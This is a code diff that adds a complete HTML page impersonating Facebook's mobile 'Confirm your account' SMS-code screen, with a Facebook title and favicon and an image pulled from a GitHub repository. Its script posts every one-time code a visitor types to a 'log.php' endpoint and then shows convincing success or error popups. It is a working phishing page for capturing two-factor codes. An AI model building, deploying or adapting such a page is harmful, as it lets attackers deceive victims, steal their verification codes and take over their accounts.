@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>https://m.facebook.com/</title>
+  <link rel="icon" type="image/x-icon" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yi/r/4Kv5U5b1o3f.png">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+    }
+
+    .card {
+      padding: 10px;
+      border-radius: 12px;
+      text-align: center;
+      position: relative;
+    }
+
+    .card h2 {
+      margin-left: -90px;
+    }
+
+    .card p {
+      font-size: 14px;
+    }
+
+    .card img {
+      border-radius: 10px;
+      width: 90%;
+      margin: 20px 0 0 0;
+    }
+
+    .input-wrapper {
+      position: relative;
+      width: 90%;
+      margin-bottom: 20px;
+    }
+
+    input[type="number"] {
+      padding: 20px 20px 20px 30px;
+      border-radius: 10px;
+      width: 90%;
+      background: white;
+      color: black;
+      font-size: 18px;
+      margin-left: 7px;
+      outline: none;
+      border: 2px solid #ddd;
+    }
+
+    .container input::placeholder {
+      color: transparent;
+    }
+
+    .container input:focus {
+      outline: 1px solid black;
+    }
+
+    .container label {
+      color: #555;
+      position: relative;
+      left: -6em;
+      top: -2.6em;
+      cursor: auto;
+      transition: 0.1s ease all;
+    }
+
+    input:focus ~ label,
+    input:not(:placeholder-shown) ~ label {
+      top: -4.3em;
+      color: #555;
+      font-size: 15px;
+    }
+
+    .cross-icon {
+      position: absolute;
+      right: -10px;
+      top: 40%;
+      transform: translateY(-50%);
+      font-size: 40px;
+      color: #666;
+      cursor: pointer;
+      display: none;
+      user-select: none;
+    }
+
+    button {
+      width: 96%;
+      height: 45px;
+      font-size: 18px;
+      border: 1px solid #0066E8;
+      border-radius: 30px;
+      background: #0066E8;
+      margin-top: -20px;
+      color: white;
+      cursor: pointer;
+    }
+
+    .text-link {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 80%;
+      max-width: 300px;
+      text-align: center;
+    }
+
+    .popup-content p {
+      margin: 0 0 20px 0;
+      font-size: 16px;
+    }
+
+    .popup-content button {
+      background-color: transparent;
+      border: none;
+      color: #1877f2;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <h2>Confirm your account</h2>
+      <p>We sent a code via SMS. Enter that code to confirm your account.</p>
+      <img src="https://raw.githubusercontent.com/webappsite/.mahadeb/refs/heads/main/FB-png/ZXDhqU01Coo.png" alt="SMS Shield" />
+
+      <div class="input-wrapper">
+        <input type="number" id="otp" placeholder="Enter code" maxlength="6" oninput="toggleCross(); checkLength();" />
+        <label for="otp">Enter code</label>
+        <span class="cross-icon" id="cross" onclick="clearInput()">×</span>
+      </div>
+
+      <button onclick="checkOTP()">Continue</button>
+      <div class="text-link" onclick="sendCodeAgain()">Didn't receive a code?</div>
+    </div>
+  </div>
+
+  <!-- Popup -->
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <p id="popupMessage">Message</p>
+      <hr>
+      <button onclick="closePopup()">Try Again</button>
+    </div>
+  </div>
+  
+  <script>
+  function checkLength() {
+    const btn = document.querySelector("button");
+    const otp = document.getElementById("otp").value.trim();
+
+    if (otp.length >= 6) {
+      btn.disabled = false;
+      btn.style.opacity = 1;
+      btn.style.cursor = "pointer";
+    } else {
+      btn.disabled = true;
+      btn.style.opacity = 0.6;
+      btn.style.cursor = "not-allowed";
+    }
+  }
+
+  window.onload = () => {
+    toggleCross?.();
+    checkLength();
+  }
+</script>
+
+  <script>
+    const correctOTP = "121212";
+
+    function toggleCross() {
+      const input = document.getElementById("otp");
+      const cross = document.getElementById("cross");
+      cross.style.display = input.value.trim() ? "block" : "none";
+    }
+
+    function clearInput() {
+      const input = document.getElementById("otp");
+      input.value = "";
+      toggleCross();
+    }
+
+    function showPopup(message, callback = null) {
+      document.getElementById("popupMessage").innerText = message;
+      document.getElementById("popup").style.display = "flex";
+
+      if (callback) {
+        setTimeout(() => {
+          closePopup();
+          callback();
+        }, 2000);
+      }
+    }
+
+    function closePopup() {
+      document.getElementById("popup").style.display = "none";
+    }
+
+    function checkOTP() {
+      const otp = document.getElementById("otp").value.trim();
+
+      if (!otp) {
+        showPopup("Enter a code\nYou'll need to enter a code to continue.");
+        return;
+      }
+
+      fetch("log.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "otp=" + encodeURIComponent(otp),
+      }).then(() => {
+        if (otp === correctOTP) {
+          showPopup("Code verified successfully!", () => {
+            window.location.href = "successfully.html";
+          });
+        } else {
+          showPopup("That code didn't work\nPlease re-enter your code or request a new one.");
+        }
+      });
+    }
+
+    function sendCodeAgain() {
+      showPopup("A new code has been sent (simulation).");
+    }
+
+    window.onload = () => toggleCross();
+  </script>
+</body>
+</html>
